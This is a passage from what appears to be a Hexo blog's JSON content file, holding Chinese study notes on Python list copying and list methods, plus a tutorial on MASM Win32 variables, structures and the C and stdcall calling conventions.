class=\"line\">list2=list1.copy()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>列表的copy()方法是浅copy，只能copy一层，即嵌套的还是共享引用。</li>\n<li>想要迭代copy需要导入copy模块，然后使用copy.deepcopy()方法。</li>\n</ul>\n<h4 id=\"一些理解\"><a href=\"#一些理解\" class=\"headerlink\" title=\"一些理解\"></a><strong>一些理解</strong></h4><ul>\n<li>列表名变量是指向列表对象的引用，列表又是0个或多个对象的引用。列表的浅拷贝实际上列表名变量成为了不同列表对象引用，但他们的列表对象都是指向相同元素对象的引用。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list1=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">list2=list1.copy()</span><br><span class=\"line\">list3=list1</span><br><span class=\"line\"></span><br><span class=\"line\">id(list1) == id(list2)   <span class=\"comment\">#False</span></span><br><span class=\"line\">list1 <span class=\"keyword\">is</span> list2           <span class=\"comment\">#False</span></span><br><span class=\"line\"></span><br><span class=\"line\">id(list1) == id(list3)   <span class=\"comment\">#True</span></span><br><span class=\"line\">list1 <span class=\"keyword\">is</span> list3           <span class=\"comment\">#True</span></span><br><span class=\"line\"></span><br><span class=\"line\">list1[<span class=\"number\">0</span>] <span class=\"keyword\">is</span> list2[<span class=\"number\">0</span>]     <span class=\"comment\">#True</span></span><br><span class=\"line\">list1[<span class=\"number\">1</span>] <span class=\"keyword\">is</span> list2[<span class=\"number\">1</span>]     <span class=\"comment\">#True</span></span><br><span class=\"line\">     .......</span><br></pre></td></tr></table></figure>\n<ul>\n<li>拷贝让list1和list2成为了不同列表对象的引用，但他们的列表对象都引用着相同的元素对象。修改任意一个列表的元素，实际上只是修改了列表对某个对象的引用而已，因此不会影响到另一个列表(因为两个列表是不同的对象)。</li>\n<li>list3=list1赋值操作，让list3和list1引用了同一个列表对象，因此更改这个列表对象引用的对象，list3与list1都会同时改变。</li>\n</ul>\n<h4 id=\"二次总结\"><a href=\"#二次总结\" class=\"headerlink\" title=\"二次总结\"></a><strong>二次总结</strong></h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>列表是可变的序列。</span><br><span class=\"line\"><span class=\"number\">2.</span>列表是任意对象的有序集合。</span><br><span class=\"line\"><span class=\"number\">3.</span>列表中的元素实质是列表对象引用了一个或多个其他对象。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4.</span>强制类型转换：list()  <span class=\"comment\">#操作对象为序列</span></span><br><span class=\"line\"><span class=\"number\">5.</span>列表操作</span><br><span class=\"line\">\t改：</span><br><span class=\"line\">\t\t索引赋值</span><br><span class=\"line\">\t\t  分片赋值：实质是先删除切片内容，再插入赋值的新内容。因此切片赋值不要求左右两边项相等。</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t查：</span><br><span class=\"line\">\t\tindex()    <span class=\"comment\">#返回元素对应的下标</span></span><br><span class=\"line\">\t\tcount()    <span class=\"comment\">#返回元素在列表中的次数</span></span><br><span class=\"line\">\t增：</span><br><span class=\"line\">\t\tappend()   <span class=\"comment\">#在最后追加一个元素（原处修改）。</span></span><br><span class=\"line\">\t\textend()   <span class=\"comment\">#将一个列表追加到另一个列表后面（原处修改）。</span></span><br><span class=\"line\">\t\tinsert()   <span class=\"comment\">#指定下标插入指定元素（原处修改）。</span></span><br><span class=\"line\">\t\t   +       <span class=\"comment\">#序列合并（产生新对象）。</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"> \t删：\t</span><br><span class=\"line\">\t\tremove()        <span class=\"comment\">#从列表中删除指定元素（原处修改）。</span></span><br><span class=\"line\">\t\tpop()           <span class=\"comment\">#删除并弹出指定下标的函数（原处修改），不指定下标则删除并弹出最后一个元素。</span></span><br><span class=\"line\">\t\tclear()         <span class=\"comment\">#清空列表（原处修改）。</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">del</span> list[<span class=\"number\">0</span>]     <span class=\"comment\">#删除索引出来的元素（不是列表特有的，也是原处修改）。</span></span><br><span class=\"line\">  </span><br><span class=\"line\">\t其他：</span><br><span class=\"line\">\t\treverse()   <span class=\"comment\">#翻转列表（原处修改）</span></span><br><span class=\"line\">\t\tsort()      <span class=\"comment\">#排序列表（原处修改）</span></span><br><span class=\"line\">\t\tcopy()      <span class=\"comment\">#浅拷贝</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">6.</span>sort()与sorted()</span><br><span class=\"line\">\tsort()是列表专有的，sorted()是内置函数，对于所有序列都可用</span><br><span class=\"line\">\tsort()是原处修改，sorted()是产生新对象</span><br><span class=\"line\">\treverse()和reversed()也是一样的。</span><br></pre></td></tr></table></figure>"},{"title":"03python模块之subprocess","date":"2019-04-10T02:49:30.000Z","_content":"","source":"_posts/03python模块之subprocess.md","raw":"---\ntitle: 03python模块之subprocess\ndate: 2019-04-10 10:49:30\ntags:\ncategories:\n---\n","slug":"03python模块之subprocess","published":1,"updated":"2019-04-10T02:49:30.738Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83jm000j7or07uknzn8g","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Win32编程基础Chapter 4：调用约定","date":"2019-04-01T06:22:00.000Z","_content":"\n#### 0x00 全局变量\n\n全局变量的作用域是整个程序。\n\n全局变量在`.data`或`.data?`段中定义。在`.data`段中定义变量时可以指定初值，也可以用`?`表示预留。在`.data?`段中定义变量时不能初始化值，只能使用`?`预留空间。使用`?`时，编译器实际是用0替代的。\n\n可以同时定义变量的类型和长度。\n\n```\n变量名  类型  初始值1，初始值2...\n变量名  类型  重复数量 dup(初始值1,初始值2...)\n```\n\n<!-- more -->\n\n常用类型：\n\n```\ndb  定义字节类型，1B。\ndw  定义字类型，2B。\ndd  定义双字类型，4B。\ndf  定义三字类型，6B。\ndq  定义四字类型，8B。\n\n;注意，只有在定义全局变量的时候才能使用类型的简写。\n```\n\n#### 0x01 局部变量\n\n局部变量的作用域只在当前子程序中。\n\n局部变量存储在栈空间中。\n\n局部变量定义在子程序定义位置的proc之后，子程序内部其他指令前。\n\n局部变量名不能与全局变量名同名。\n\n局部变量定义时不能直接初始化值，因为local伪指令的作用只是预留相应的栈空间给局部变量。\n\n局部变量定义：\n\nMASM提供的伪指令local定义局部变量。\n\n格式：\n\n```assembly\nlocal 变量名 [[重复数量]] [:类型]\n```\n\n类型有：\n\n```\n:数据结构名   ;数据结构\n:byte       ;字节型\n:word       ;字型\n:dword      ;双字型,默认就是dw，所以可以省略. \n```\n\n**局部变量也存储在堆栈中，进入（执行）子程序时，会修改堆栈指针ESP来预留给局部变量的空间。**\n\n例子：\n\n```assembly\nTestPro proc                   ;定义一个子程序\n\nlocal str1:dword,str2:word     ;定义两个变量，str1时双字型，str2是字型。\nlocal str3:byte                ;定义一个变量，str3是字节型。\n\nmov eax,str1\nmov bx,str2\nmov cl,str3\nret \n\nTestPro proc endp  ;子程序结束\n```\n\n将上面代码进行编译然后再反汇编得到：\n\n```assembly\npush ebp              ;先保存ebp寄存器的原始值。\nmov  ebp,esp          ;将此时的esp指针地址给ebp。\nadd  esp,FFFFFFF8     ;调整esp以预留局部变量所需的空间，上面程序定义的局部变量共需7B,但预留了8B，是因为esp操作都是按dword,就像sp都是+2或-2一样。\n                      ;FFFFFFF8是-8,之所以是-8是因为栈是由大往小开始的。\n\nmov  eax,dword ptr [ebp-4]    ;在[ebp-4]内存单元取双字数据（4byte）给eax\nmov bx,word ptr [ebp-6]       ;在[ebp-6]内存单元取字数据（2byte）给bx\nmov cl,byte ptr [ebp-7]       ;在[ebp-7]内存单元取字数据（2byte）给cl\n\nleave    ;等同于：mov esp,ebp 、 pop ebp\nret\n```\n\n- 注意：ebp之后没有任何更改，而是作为一个参考点。ebp指向压入局部变量之前的栈顶元素。\n\n#### 0x02 数据结构\n\n数据结构实际上是包含多个字段的模板，字段的类型可以是任意的（byte、word、dword....）\n\n定义数据结构格式：\n\n```assembly\n结构名 struct                例子：\n                              WNDCLASS struct             \n字段1  类型  ？                     str1  byte  ?\n字段2  类型  ？                     str2  dword ?\n   ...                        WNDCLASS ends\n\n结构名 ends\n```\n\n可以把数据类型当作是一种自定义类型，因此定义了数据结构后，可以使用数据结构作为创建变量类型：\n\n```assembly\n.data?\nszWndClass  WNDCLASS  <>      ;未初始化值的结构。\n```\n\n或者\n\n```assembly\n.data\nszWndClass  WNDCLASS  <1,2>    ;结构的两个字段分别赋值1,2\n```\n\nPS：这样来看定义的结构类似于类，利用结构定义的变量类似于类的实例。\n\n数据结构的字段访问：\n\n```assembly\nszWndClass.str1\nszWndClass.str2    \n```\n\n#### 0x03 变量访问\n\n在MASM中，如果要以变量类型长度以外的长度去访问变量，必须要显式的指明访问长度。（否则操作的寄存器与变量类型长度不一致时，将会报错）\n\n方法：\n\n```\n类型  ptr 变量名\n```\n\n避免寄存器长度与变量类型长度不一致，可以使用movz指令。\n\n变量尺寸或数据项数：\n\n```\nsizeof    变量/数据类型/数据结构      ;取得字节数。\nlengthof  变量/数据类型/数据结构      ;变量中的数据项数。\n```\n\n获取变量地址：\n\n```\noffset 变量名 \n```\n\noffset只能用于全局变量，因为局部变量的地址在编译时是不能确定的，因此使用lea指令：\n\n```assembly\nlea eax,[ebp-4]    ;取得ebp-4的内存地址并存储到EAX\n```\n\naddr用于在参数时使用，addr 全局变量时，会编译成offset;addr 局部变量时，会编译为lea，但能addr的局部变量，必须是在参数中的。\n\n```assembly\naddr 局部变量/全局变量 \n```\n\n#### 0x04 参数传递与堆栈平衡\n\n我们知道，参数是通过栈来传递的，那么完成函数调用后，参数就已经没有作用了，因此要把栈恢复到压入参数前的状态，这个过程就是堆栈平衡。\n\n参数传递约定：\n\n> - C与Stdcall采用从右往左开始压入栈中。\n\n平衡堆栈：\n\n> - C由调用者平衡堆栈。\n> - Stdcall由被调用者平衡堆栈。\n\nWin32使用Stdcall调用约定。\n\n**C调用方式：**\n\n子程序定义及调用（传入参数：1、2）：            ![](03-win32编程基础Chapter-4\\QQ截图20190401154311.png)                     \n\n编译子程序后再反汇编：\n\n![](03-win32编程基础Chapter-4\\QQ截图20190401154931.png)      \n\n![](03-win32编程基础Chapter-4\\QQ截图20190401155014.png)\n\n- 可以看到参数`2`先被压入栈中，然后才压入`1`，即从右到左。\n- 而平衡堆栈是在call之后使用`add esp,0000008`，因此是调用者平衡的堆栈。\n\n**Stdcal调用方式：**\n\n子程序定义及调用（传入参数：1、2）： \n\n![](03-win32编程基础Chapter-4\\QQ截图20190401155645.png)\n\n编译子程序后再反汇编：\n\n![](03-win32编程基础Chapter-4\\QQ截图20190401155758.png)\n\n![](03-win32编程基础Chapter-4\\QQ截图20190401155812.png)\n\n- 可以看到参数`2`先被压入栈中，然后才压入`1`，即从右到左。\n- 但平衡堆栈是在子程序中使用了`ret 0008`，即被调用者平衡的堆栈。\n\n> ret指令后加一个操作数表示，在ret后，使用esp+操作数。\n\n#### 0x05 完整的栈操作过程\n\n设最初的栈状态为esp。\n\n首先，调用函数并传入参数`invoke 函数名,参数1,参数2`：\n\n- 将两个参数依次压入栈中：\n  - `push 参数2`\n  - `push 参数1`\n  - 此时esp-4-4。\n- 然后`call  函数定义地址`。\n  - 将此时的EIP压入栈中：`push eip`\n    - 此时esp-8-4\n\n进入函数内部执行函数：\n\n- 保存当前ebp的数据：`push ebp`\n  - 此时esp-12-4。\n- 将当前esp的值给ebp：`mov ebp,esp`\n- 为局部变量留空间：`add esp,fffffff8`\n  - 此时esp-16-8\n- 使用ebp获取参数、局部变量。\n- 销毁局部变量：`leave`\n  - 恢复esp状态到为局部变量留空间前：`mov esp,ebp`\n    - 此时esp-24+8\n  - 恢复ebp：`pop ebp`\n    - 此时esp-16+4\n- 函数返回：`ret 8`\n  - `add esp,8`\n    - 此时esp-12+8\n  - `pop eip`\n    - 此时esp-4+4。","source":"_posts/03-win32编程基础Chapter-4.md","raw":"---\ntitle: Win32编程基础Chapter 4：调用约定\ndate: 2019-04-01 14:22:00\ntags:\n\t- Win32\n\t- 汇编语言\ncategories: Win32\n---\n\n#### 0x00 全局变量\n\n全局变量的作用域是整个程序。\n\n全局变量在`.data`或`.data?`段中定义。在`.data`段中定义变量时可以指定初值，也可以用`?`表示预留。在`.data?`段中定义变量时不能初始化值，只能使用`?`预留空间。使用`?`时，编译器实际是用0替代的。\n\n可以同时定义变量的类型和长度。\n\n```\n变量名  类型  初始值1，初始值2...\n变量名  类型  重复数量 dup(初始值1,初始值2...)\n```\n\n<!-- more -->\n\n常用类型：\n\n```\ndb  定义字节类型，1B。\ndw  定义字类型，2B。\ndd  定义双字类型，4B。\ndf  定义三字类型，6B。\ndq  定义四字类型，8B。\n\n;注意，只有在定义全局变量的时候才能使用类型的简写。\n```\n\n#### 0x01 局部变量\n\n局部变量的作用域只在当前子程序中。\n\n局部变量存储在栈空间中。\n\n局部变量定义在子程序定义位置的proc之后，子程序内部其他指令前。\n\n局部变量名不能与全局变量名同名。\n\n局部变量定义时不能直接初始化值，因为local伪指令的作用只是预留相应的栈空间给局部变量。\n\n局部变量定义：\n\nMASM提供的伪指令local定义局部变量。\n\n格式：\n\n```assembly\nlocal 变量名 [[重复数量]] [:类型]\n```\n\n类型有：\n\n```\n:数据结构名   ;数据结构\n:byte       ;字节型\n:word       ;字型\n:dword      ;双字型,默认就是dw，所以可以省略. \n```\n\n**局部变量也存储在堆栈中，进入（执行）子程序时，会修改堆栈指针ESP来预留给局部变量的空间。**\n\n例子：\n\n```assembly\nTestPro proc                   ;定义一个子程序\n\nlocal str1:dword,str2:word     ;定义两个变量，str1时双字型，str2是字型。\nlocal str3:byte                ;定义一个变量，str3是字节型。\n\nmov eax,str1\nmov bx,str2\nmov cl,str3\nret \n\nTestPro proc endp  ;子程序结束\n```\n\n将上面代码进行编译然后再反汇编得到：\n\n```assembly\npush ebp              ;先保存ebp寄存器的原始值。\nmov  ebp,esp          ;将此时的esp指针地址给ebp。\nadd  esp,FFFFFFF8     ;调整esp以预留局部变量所需的空间，上面程序定义的局部变量共需7B,但预留了8B，是因为esp操作都是按dword,就像sp都是+2或-2一样。\n                      ;FFFFFFF8是-8,之所以是-8是因为栈是由大往小开始的。\n\nmov  eax,dword ptr [ebp-4]    ;在[ebp-4]内存单元取双字数据（4byte）给eax\nmov bx,word ptr [ebp-6]       ;在[ebp-6]内存单元取字数据（2byte）给bx\nmov cl,byte ptr [ebp-7]       ;在[ebp-7]内存单元取字数据（2byte）给cl\n\nleave    ;等同于：mov esp,ebp 、 pop ebp\nret\n```\n\n- 注意：ebp之后没有任何更改，而是作为一个参考点。ebp指向压入局部变量之前的栈顶元素。\n\n#### 0x02 数据结构\n\n数据结构实际上是包含多个字段的模板，字段的类型可以是任意的（byte、word、dword....）\n\n定义数据结构格式：\n\n```assembly\n结构名 struct                例子：\n                              WNDCLASS struct             \n字段1  类型  ？                     str1  byte  ?\n字段2  类型  ？                     str2  dword ?\n   ...                        WNDCLASS ends\n\n结构名 ends\n```\n\n可以把数据类型当作是一种自定义类型，因此定义了数据结构后，可以使用数据结构作为创建变量类型：\n\n```assembly\n.data?\nszWndClass  WNDCLASS  <>      ;未初始化值的结构。\n```\n\n或者\n\n```assembly\n.data\nszWndClass  WNDCLASS  <1,2>    ;结构的两个字段分别赋值1,2\n```\n\nPS：这样来看定义的结构类似于类，利用结构定义的变量类似于类的实例。\n\n数据结构的字段访问：\n\n```assembly\nszWndClass.str1\nszWndClass.str2    \n```\n\n#### 0x03 变量访问\n\n在MASM中，如果要以变量类型长度以外的长度去访问变量，必须要显式的指明访问长度。（否则操作的寄存器与变量类型长度不一致时，将会报错）\n\n方法：\n\n```\n类型  ptr 变量名\n```\n\n避免寄存器长度与变量类型长度不一致，可以使用movz指令。\n\n变量尺寸或数据项数：\n\n```\nsizeof    变量/数据类型/数据结构      ;取得字节数。\nlengthof  变量/数据类型/数据结构      ;变量中的数据项数。\n```\n\n获取变量地址：\n\n```\noffset 变量名 \n```\n\noffset只能用于全局变量，因为局部变量的地址在编译时是不能确定的，因此使用lea指令：\n\n```assembly\nlea eax,[ebp-4]    ;取得ebp-4的内存地址并存储到EAX\n```\n\naddr用于在参数时使用，addr 全局变量时，会编译成offset;addr 局部变量时，会编译为lea，但能addr的局部变量，必须是在参数中的。\n\n```assembly\naddr 局部变量/全局变量 \n```\n\n#### 0x04 参数传递与堆栈平衡\n\n我们知道，参数是通过栈来传递的，那么完成函数调用后，参数就已经没有作用了，因此要把栈恢复到压入参数前的状态，这个过程就是堆栈平衡。\n\n参数传递约定：\n\n> - C与Stdcall采用从右往左开始压入栈中。\n\n平衡堆栈：\n\n> - C由调用者平衡堆栈。\n> - Stdcall由被调用者平衡堆栈。\n\nWin32使用Stdcall调用约定。\n\n**C调用方式：**\n\n子程序定义及调用（传入参数：1、2）：            ![](03-win32编程基础Chapter-4\\QQ截图20190401154311.png)                     \n\n编译子程序后再反汇编：\n\n![](03-win32编程基础Chapter-4\\QQ截图20190401154931.png)      \n\n![](03-win32编程基础Chapter-4\\QQ截图20190401155014.png)\n\n- 可以看到参数`2`先被压入栈中，然后才压入`1`，即从右到左。\n- 而平衡堆栈是在call之后使用`add esp,0000008`，因此是调用者平衡的堆栈。\n\n**Stdcal调用方式：**\n\n子程序定义及调用（传入参数：1、2）： \n\n![](03-win32编程基础Chapter-4\\QQ截图20190401155645.png)\n\n编译子程序后再反汇编：\n\n![](03-win32编程基础Chapter-4\\QQ截图20190401155758.png)\n\n![](03-win32编程基础Chapter-4\\QQ截图20190401155812.png)\n\n- 可以看到参数`2`先被压入栈中，然后才压入`1`，即从右到左。\n- 但平衡堆栈是在子程序中使用了`ret 0008`，即被调用者平衡的堆栈。\n\n> ret指令后加一个操作数表示，在ret后，使用esp+操作数。\n\n#### 0x05 完整的栈操作过程\n\n设最初的栈状态为esp。\n\n首先，调用函数并传入参数`invoke 函数名,参数1,参数2`：\n\n- 将两个参数依次压入栈中：\n  - `push 参数2`\n  - `push 参数1`\n  - 此时esp-4-4。\n- 然后`call  函数定义地址`。\n  - 将此时的EIP压入栈中：`push eip`\n    - 此时esp-8-4\n\n进入函数内部执行函数：\n\n- 保存当前ebp的数据：`push ebp`\n  - 此时esp-12-4。\n- 将当前esp的值给ebp：`mov ebp,esp`\n- 为局部变量留空间：`add esp,fffffff8`\n  - 此时esp-16-8\n- 使用ebp获取参数、局部变量。\n- 销毁局部变量：`leave`\n  - 恢复esp状态到为局部变量留空间前：`mov esp,ebp`\n    - 此时esp-24+8\n  - 恢复ebp：`pop ebp`\n    - 此时esp-16+4\n- 函数返回：`ret 8`\n  - `add esp,8`\n    - 此时esp-12+8\n  - `pop eip`\n    - 此时esp-4+4。","slug":"03-win32编程基础Chapter-4","published":1,"updated":"2019-04-01T08:46:22.062Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83jq000o7or0sfegh8gw","content":"<h4 id=\"0x00-全局变量\"><a href=\"#0x00-全局变量\" class=\"headerlink\" title=\"0x00 全局变量\"></a>0x00 全局变量</h4><p>全局变量的作用域是整个程序。</p>\n<p>全局变量在<code>.data</code>或<code>.data?</code>段中定义。在<code>.data</code>段中定义变量时可以指定初值，也可以用<code>?</code>表示预留。在<code>.data?</code>段中定义变量时不能初始化值，只能使用<code>?</code>预留空间。使用<code>?</code>时，编译器实际是用0替代的。</p>\n<p>可以同时定义变量的类型和长度。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">变量名  类型  初始值1，初始值2...</span><br><span class=\"line\">变量名  类型  重复数量 dup(初始值1,初始值2...)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>常用类型：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db  定义字节类型，1B。</span><br><span class=\"line\">dw  定义字类型，2B。</span><br><span class=\"line\">dd  定义双字类型，4B。</span><br><span class=\"line\">df  定义三字类型，6B。</span><br><span class=\"line\">dq  定义四字类型，8B。</span><br><span class=\"line\"></span><br><span class=\"line\">;注意，只有在定义全局变量的时候才能使用类型的简写。</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x01-局部变量\"><a href=\"#0x01-局部变量\" class=\"headerlink\" title=\"0x01 局部变量\"></a>0x01 局部变量</h4><p>局部变量的作用域只在当前子程序中。</p>\n<p>局部变量存储在栈空间中。</p>\n<p>局部变量定义在子程序定义位置的proc之后，子程序内部其他指令前。</p>\n<p>局部变量名不能与全局变量名同名。</p>\n<p>局部变量定义时不能直接初始化值，因为local伪指令的作用只是预留相应的栈空间给局部变量。</p>\n<p>局部变量定义：</p>\n<p>MASM提供的伪指令local定义局部变量。</p>\n<p>格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local 变量名 [[重复数量]] [:类型]</span><br></pre></td></tr></table></figure>\n<p>类型有：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">:数据结构名   ;数据结构</span><br><span class=\"line\">:byte       ;字节型</span><br><span class=\"line\">:word       ;字型</span><br><span class=\"line\">:dword      ;双字型,默认就是dw，所以可以省略.</span><br></pre></td></tr></table></figure>\n<p><strong>局部变量也存储在堆栈中，进入（执行）子程序时，会修改堆栈指针ESP来预留给局部变量的空间。</strong></p>\n<p>例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TestPro proc                   ;定义一个子程序</span><br><span class=\"line\"></span><br><span class=\"line\">local str1:dword,str2:word     ;定义两个变量，str1时双字型，str2是字型。</span><br><span class=\"line\">local str3:byte                ;定义一个变量，str3是字节型。</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,str1</span><br><span class=\"line\">mov bx,str2</span><br><span class=\"line\">mov cl,str3</span><br><span class=\"line\">ret </span><br><span class=\"line\"></span><br><span class=\"line\">TestPro proc endp  ;子程序结束</span><br></pre></td></tr></table></figure>\n<p>将上面代码进行编译然后再反汇编得到：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push ebp              ;先保存ebp寄存器的原始值。</span><br><span class=\"line\">mov  ebp,esp          ;将此时的esp指针地址给ebp。</span><br><span class=\"line\">add  esp,FFFFFFF8     ;调整esp以预留局部变量所需的空间，上面程序定义的局部变量共需7B,但预留了8B，是因为esp操作都是按dword,就像sp都是+2或-2一样。</span><br><span class=\"line\">                      ;FFFFFFF8是-8,之所以是-8是因为栈是由大往小开始的。</span><br><span class=\"line\"></span><br><span class=\"line\">mov  eax,dword ptr [ebp-4]    ;在[ebp-4]内存单元取双字数据（4byte）给eax</span><br><span class=\"line\">mov bx,word ptr [ebp-6]       ;在[ebp-6]内存单元取字数据（2byte）给bx</span><br><span class=\"line\">mov cl,byte ptr [ebp-7]       ;在[ebp-7]内存单元取字数据（2byte）给cl</span><br><span class=\"line\"></span><br><span class=\"line\">leave    ;等同于：mov esp,ebp 、 pop ebp</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<ul>\n<li>注意：ebp之后没有任何更改，而是作为一个参考点。ebp指向压入局部变量之前的栈顶元素。</li>\n</ul>\n<h4 id=\"0x02-数据结构\"><a href=\"#0x02-数据结构\" class=\"headerlink\" title=\"0x02 数据结构\"></a>0x02 数据结构</h4><p>数据结构实际上是包含多个字段的模板，字段的类型可以是任意的（byte、word、dword….）</p>\n<p>定义数据结构格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">结构名 struct                例子：</span><br><span class=\"line\">                              WNDCLASS struct             </span><br><span class=\"line\">字段1  类型  ？                     str1  byte  ?</span><br><span class=\"line\">字段2  类型  ？                     str2  dword ?</span><br><span class=\"line\">   ...                        WNDCLASS ends</span><br><span class=\"line\"></span><br><span class=\"line\">结构名 ends</span><br></pre></td></tr></table></figure>\n<p>可以把数据类型当作是一种自定义类型，因此定义了数据结构后，可以使用数据结构作为创建变量类型：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data?</span><br><span class=\"line\">szWndClass  WNDCLASS  &lt;&gt;      ;未初始化值的结构。</span><br></pre></td></tr></table></figure>\n<p>或者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data</span><br><span class=\"line\">szWndClass  WNDCLASS  &lt;1,2&gt;    ;结构的两个字段分别赋值1,2</span><br></pre></td></tr></table></figure>\n<p>PS：这样来看定义的结构类似于类，利用结构定义的变量类似于类的实例。</p>\n<p>数据结构的字段访问：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">szWndClass.str1</span><br><span class=\"line\">szWndClass.str2</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x03-变量访问\"><a href=\"#0x03-变量访问\" class=\"headerlink\" title=\"0x03 变量访问\"></a>0x03 变量访问</h4><p>在MASM中，如果要以变量类型长度以外的长度去访问变量，必须要显式的指明访问长度。（否则操作的寄存器与变量类型长度不一致时，将会报错）</p>\n<p>方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">类型  ptr 变量名</span><br></pre></td></tr></table></figure>\n<p>避免寄存器长度与变量类型长度不一致，可以使用movz指令。</p>\n<p>变量尺寸或数据项数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sizeof    变量/数据类型/数据结构      ;取得字节数。</span><br><span class=\"line\">lengthof  变量/数据类型/数据结构      ;变量中的数据项数。</span><br></pre></td></tr></table></figure>\n<p>获取变量地址：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">offset 变量名</span><br></pre></td></tr></table></figure>\n<p>offset只能用于全局变量，因为局部变量的地址在编译时是不能确定的，因此使用lea指令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea eax,[ebp-4]    ;取得ebp-4的内存地址并存储到EAX</span><br></pre></td></tr></table></figure>\n<p>addr用于在参数时使用，addr 全局变量时，会编译成offset;addr 局部变量时，会编译为lea，但能addr的局部变量，必须是在参数中的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 